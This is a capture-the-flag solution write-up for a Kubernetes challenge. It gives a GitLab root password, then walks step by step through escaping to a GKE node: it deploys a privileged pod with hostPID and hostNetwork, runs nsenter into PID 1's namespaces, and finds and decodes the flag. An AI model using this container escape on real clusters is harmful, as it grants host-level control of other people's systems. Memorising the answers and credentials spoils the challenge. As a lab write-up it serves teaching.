# Solution

## Part 1 - Gitlab

- Access <gitlab.foobar.com>
  - Use credentials:
    - u: `root`
    - p: `Ikn0wwh@ty0ud1dl@5tKub3C0n3`
  - 

# Challenge 1 - Aut0m0tiv3 - Solution

Connect to GKE cluster:
```bash
gcloud container clusters get-credentials kubecon-na-22-ctf-1 --zone europe-central2-a --project cilium-dev
```

Modify the pod spec and include the "hostPID", "hostNetwork", "privileged" flags and set it to true:
```bash
cat car-the-privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: car-the-privileged-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: car-the-privileged-pod
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
```

Apply it:
```bash
kubectl apply -f car-the-privileged-pod.yaml
pod/car-the-privileged-pod created
```

Exec into pod:
```bash
kubectl exec -it car-the-privileged-pod -- /bin/bash
root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/#
```

Enter into all the namespaces:
```bash
root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/# nsenter -t 1 -m -u -n -i -p bash
gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / #
```

Find the flag:
```bash
gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / # find .  -name "*flag*" -print
./home/car_capital/f0rd_flag.png
```

The file is `./home/car_capital/f0rd_flag.png`

Get the content:
```bash
cat ./home/car_capital/f0rd_flag.png

aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTi12Nms0YVNpNnFvMXgyY3BJS1IwbjVW
R0dXMFh4a1Qvdmlldw==
```

Decode it from base64:
```bash
base64 -d /home/car_capital/f0rd_flag.png

https://drive.google.com/file/d/1N-v6k4aSi6qo1x2cpIKR0n5VGGW0XxkT/view
```

Open the link, get the car picture :)
